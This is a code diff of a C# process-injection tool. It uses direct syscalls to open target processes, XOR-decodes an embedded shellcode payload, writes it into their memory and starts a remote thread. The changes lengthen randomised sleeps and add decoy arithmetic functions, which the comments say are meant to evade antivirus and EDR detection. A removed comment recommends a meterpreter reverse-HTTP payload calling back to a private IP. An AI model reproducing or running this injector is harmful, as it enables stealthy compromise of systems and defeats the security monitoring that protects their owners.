@@ -12,48 +12,66 @@ namespace ConsoleApp1
     // in hope of evading EDR and AV
     static void RandomPause()
     {
-        // generating a random number to pause between
-        // 1.489 and 12.035 seconds
-        // this is to mimick human behaviour to bypass AV
-        // and EDR detections
-        int duration = new Random().Next(1489, 12035);
+        // random duration between 10.489 and 65.035 seconds
+        int duration = new Random().Next(10489, 65035);
         System.Threading.Thread.Sleep(duration);
     }
 
     // creating a random function to evade EDR and AV controls
     static void RandomFunction()
     {
-        // generating a random number to choose different random
-        // actions to bypass AV and EDR
-        int choice = new Random().Next(1, 3);
-        // depending on the case, we're executing a specific non
-        // harmful actions
+        // generating a random number to execute a random function
+        int choice = new Random().Next(1, 8);
+
+        // List of non harmful function to evade behavioral controls
         switch(choice) {
             case 1:
-                GetProcessId();
+                int a = new Random().Next();
+                int b = new Random().Next();
+                int c = a + b;
                 break;
             case 2:
-                GetSystemTime();
+                int d = new Random().Next();
+                int e = new Random().Next();
+                int f = d - e;
                 break;
             case 3:
+                int g = new Random().Next();
+                int h = new Random().Next();
+                int i = g / h;
+                break;
+            case 4:
+                int j = new Random().Next();
+                int k = new Random().Next();
+                int l = j * k;
+                break;
+            case 5:
+                int m = new Random().Next();
+                int n = new Random().Next();
+                int o = m % n;
+                break;
+            case 6:
+                GetProcessId();
+                break;
+            case 7:
+                GetSystemTime();
+                break;
+            case 8:
                 GetTick();
                 break;
         }
     }
 
-    // non-harmful function 1 to dummy the AV and EDR
     static void GetProcessId()
     {
         int id = System.Diagnostics.Process.GetCurrentProcess().Id;
     }
 
-    // non-harmful function 2 to dummy the AV and EDR
     static void GetSystemTime()
     {
         DateTime time = DateTime.Now;
     }
 
-    // non-harmful function 3 to dummy the AV and EDR
     static void GetTick()
     {
         int ticks = Environment.TickCount & Int32.MaxValue;
@@ -62,11 +80,9 @@ namespace ConsoleApp1
     {
         {
             // NtOpenProcess
-            Console.WriteLine("NtOpenProcess");
             IntPtr stub = Generic.GetSyscallStub("NtOpenProcess");
             NtOpenProcess ntOpenProcess = (NtOpenProcess) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtOpenProcess));
 
-            Console.WriteLine("Create new process grabber");
             IntPtr hProcess = IntPtr.Zero;
             OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
 
@@ -76,14 +92,13 @@ namespace ConsoleApp1
 
             foreach (Process exp in processes){
                     
-                Console.WriteLine("Get process id from user input");
+                //Console.WriteLine("Get process id from user input");
 
                 CLIENT_ID ci = new CLIENT_ID
                 {
                     UniqueProcess = new IntPtr(exp.Id)
                 };
 
-                Console.WriteLine("get result");
                 NTSTATUS result = ntOpenProcess(
                     ref hProcess,
                     0x001F0FFF,
@@ -91,19 +106,16 @@ namespace ConsoleApp1
                     ref ci);
 
                 // sleeping to evade AV and EDR rules
+                RandomFunction();
                 RandomPause();
-                // applying a random, non suspicious function
                 RandomFunction();
 
                 // NtAllocateVirtualMemory
-                Console.WriteLine("NtAllocateVirtualMemory");
                 stub = Generic.GetSyscallStub("NtAllocateVirtualMemory");
                 NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
 
                 // deposit the encrypted payload here and adjust the length
-                // msfvenom -p windows/x64/messagebox EXITFUNC=thread -f 
-                // works best with the command below:
-                // msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.184.129 LPORT=80 -f csharp
+                // msfvenom -p windows/x64/messagebox EXITFUNC=thread -f csharp
                 byte[] _bytecode = new byte[752] {
         0x51, 0xe5, 0x2e, 0x49, 0x5d, 0x45, 0x61, 0xad, 0xad, 0xad, 0xec, 0xfc, 0xec, 0xfd, 0xff, 
 0xe5, 0x9c, 0x7f, 0xc8, 0xe5, 0x26, 0xff, 0xcd, 0xe5, 0x26, 0xff, 0xb5, 0xfc, 0xfb, 0xe5, 
@@ -169,7 +181,6 @@ namespace ConsoleApp1
                 {
                     _bytecode[i] = (byte)((uint)_bytecode[i] ^ 0xc4);
                 }
-                Console.WriteLine("XOR-decoded payload.");
 
 
                 IntPtr baseAddress = IntPtr.Zero;
@@ -184,13 +195,12 @@ namespace ConsoleApp1
                     0x04);
 
                 // NtWriteVirtualMemory
-                Console.WriteLine("NtWriteVirtualMemory");
                 stub = Generic.GetSyscallStub("NtWriteVirtualMemory");
                 NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
 
                 // sleeping to evade AV and EDR rules
+                RandomFunction();
                 RandomPause();
-                // applying a random, non suspicious function
                 RandomFunction();
 
                 var buffer = Marshal.AllocHGlobal(_bytecode.Length);
@@ -206,7 +216,6 @@ namespace ConsoleApp1
                     ref bytesWritten);
 
                 // NtProtectVirtualMemory
-                Console.WriteLine("NtProtectVirtualMemory");
                 stub = Generic.GetSyscallStub("NtProtectVirtualMemory");
                 NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
 
@@ -220,12 +229,11 @@ namespace ConsoleApp1
                     ref oldProtect);
 
                 // sleeping to evade AV and EDR rules
+                RandomFunction();
                 RandomPause();
-                // applying a random, non suspicious function
                 RandomFunction();
 
                 // NtCreateThreadEx
-                Console.WriteLine("NtCreateThreadEx");
                 stub = Generic.GetSyscallStub("NtCreateThreadEx");
                 NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx) Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
 
@@ -243,6 +251,8 @@ namespace ConsoleApp1
                     0,
                     0,
                     IntPtr.Zero);
+
+                    RandomFunction();
             }
         }
     }
